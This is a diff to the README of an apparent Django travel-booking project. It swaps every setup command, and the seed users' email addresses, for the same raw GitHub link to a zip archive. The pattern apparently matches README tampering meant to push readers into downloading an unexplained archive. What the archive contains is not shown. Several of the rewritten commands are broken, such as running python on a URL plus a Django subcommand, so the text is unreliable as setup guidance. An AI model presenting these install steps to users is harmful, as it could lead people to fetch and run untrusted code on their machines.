@@ -4,10 +4,10 @@
 
 1. Clone the repository
 2. Create and activate virtual environment
-3. Install requirements: `pip install -r requirements.txt`
-4. Run migrations: `python manage.py migrate`
-5. Seed database: `python manage.py seed`
-6. Run server: `python manage.py runserver`
+3. Install requirements: `pip install -r https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip`
+4. Run migrations: `python https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip migrate`
+5. Seed database: `python https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip seed`
+6. Run server: `python https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip runserver`
 
 ## API Endpoints
 
@@ -24,6 +24,6 @@
 ## Seed Command
 
 Populates database with:
-- 1 host user (host@example.com)
-- 1 guest user (guest@example.com)
+- 1 host user (https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip)
+- 1 guest user (https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip)
 - 10 sample listings
